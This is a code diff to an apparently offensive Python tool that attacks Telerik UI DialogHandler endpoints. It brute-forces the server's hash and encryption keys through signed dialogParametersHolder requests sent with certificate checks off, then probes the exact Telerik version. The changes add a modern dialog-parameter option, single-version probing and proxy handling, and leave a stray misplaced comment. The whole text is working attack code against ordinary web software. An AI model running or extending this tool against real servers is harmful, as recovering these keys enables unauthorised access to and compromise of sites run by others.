@@ -371,7 +371,7 @@ class AsyncUpload:
 
 
 class DialogHandler:
-    def __init__(self, url, include_machinekeys_bool=False, proxies={}, headers=None):
+    def __init__(self, url, modern_dialog_params=False, include_machinekeys_bool=False, proxies={}, headers=None):
         self.url = url
         self.telerik_hashkey = Telerik_HashKey()
         self.telerik_encryptionkey = Telerik_EncryptionKey()
@@ -382,6 +382,7 @@ class DialogHandler:
         self.proxies = proxies
         self.headers = headers
         self.include_machinekeys_bool = include_machinekeys_bool
+        self.modern_dialog_params = modern_dialog_params
 
     def probe_version_baseline(self):
         # Get baseline with bogus version
@@ -439,8 +440,8 @@ class DialogHandler:
             if title_match:
                 title = f" {title_match.group(1).strip()}"
 
-        print(f"{version} [{r.status_code}]{title}")
-
+        if hasattr(self, "debug") and self.debug:
+            print(f"Attempting to probe version: {version}. Got response code [{r.status_code}] with size {len(r.text)} {title}")
         if baseline_size and abs(len(r.text) - baseline_size) > 10:
             return dialog_parameters
         return None
@@ -478,7 +479,7 @@ class DialogHandler:
         print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")
 
     def solve_key(self):
-        print("\n=== PHASE 1: KEY DISCOVERY ===")
+        print("\n=== KEY DISCOVERY ===")
         # PBKDF1_MS MODE
         if self.key_derive_mode == "PBKDF1_MS":
             hashkey_counter = 0
@@ -496,10 +497,13 @@ class DialogHandler:
                 dummy_encrypted = base64.b64encode(b"A" * 16).decode()  # 16 bytes of padding
                 dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(hash_key_probe, dummy_encrypted)
                 data = {"dialogParametersHolder": dialog_parameters}
+                res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
                 if hasattr(self, "debug") and self.debug:
                     print(f"\n[DEBUG] Testing hash key #{hashkey_counter}: {hash_key}")
                     print(f"[DEBUG] Sending request to: {self.url}")
-                res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+
+
+                
                 resp_body = urllib.parse.unquote(res.text)
                 if hasattr(self, "debug") and self.debug:
                     print(f"[DEBUG] Response status: {res.status_code}")
@@ -578,6 +582,7 @@ class DialogHandler:
             baseline_size = len(baseline_res.text)
             baseline_status = baseline_res.status_code
 
+
             if hasattr(self, "debug") and self.debug:
                 print(f"\n[DEBUG] Baseline response size: {baseline_size} bytes")
                 print(f"[DEBUG] Baseline status code: {baseline_status}")
@@ -646,25 +651,30 @@ class DialogHandler:
                     (print(f"Tested {count} combinations so far...") if count % 1000 == 0 else None)
 
         if self.hash_key and self.encryption_key:
-            print("\nPHASE 1 COMPLETE: Successfully found both keys!")
+            print("\nSuccessfully found both keys!")
             return True
         else:
             print("\nFAILED: Did not find hashkey / encryption key. Exiting.")
             return False
 
     def solve_version(self):
-        print("\n=== PHASE 2: VERSION PROBING ===")
+        print("\n=== VERSION PROBING ===")
         print("Keys found! Now attempting to find the exact Telerik UI version...")
 
         baseline_size = self.probe_version_baseline()
 
         versions = []
-        for v in telerik_versions + telerik_versions_patched:
-            versions.append(v)
-        undotted_versions = []
-        for v in telerik_versions:
-            undotted_versions.append(re.sub(r"\.(?=\d+$)", "", v))
-        versions += undotted_versions
+        # If version specified, only test that version
+        if hasattr(self, "version") and self.version:
+            versions = [self.version]
+        else:
+            # Otherwise test all versions
+            for v in telerik_versions + telerik_versions_patched:
+                versions.append(v)
+            undotted_versions = []
+            for v in telerik_versions:
+                undotted_versions.append(re.sub(r"\.(?=\d+$)", "", v))
+            versions += undotted_versions
 
         for version in versions:
             dialog_parameters = self.probe_version(version, baseline_size)
@@ -739,19 +749,26 @@ def main():
     if not args.url:
         return
 
-    include_machinekeys_bool = False
-    if args.machine_keys:
-        include_machinekeys_bool = True
-        print("MachineKeys inclusion enabled. Bruteforcing will take SIGNIFICANTLY longer")
-
     if args.debug:
         print("\n=== DEBUG MODE ENABLED ===")
         print("Will show detailed information about each request and key combination being tested")
         print("This will generate a lot of output!\n")
 
-    proxies = None
+
     if args.proxy:
         proxies = {"http": args.proxy, "https": args.proxy}
+    else:
+        proxies = {}
+
+
+
+
+    include_machinekeys_bool = False
+    if args.machine_keys:
+        include_machinekeys_bool = True
+        print("MachineKeys inclusion enabled. Bruteforcing will take SIGNIFICANTLY longer")
+
+        # If version specified, only test that version
 
     headers = {}
     if args.user_agent:
@@ -820,7 +837,7 @@ def main():
             print(f"Confirmed target is Telerik UI DialogHandler")
 
         dh = DialogHandler(
-            args.url, proxies=proxies, headers=headers, include_machinekeys_bool=include_machinekeys_bool
+            args.url, modern_dialog_params=args.modern_dialog_params, proxies=proxies, headers=headers, include_machinekeys_bool=include_machinekeys_bool
         )
         if args.custom_keys:
             try:
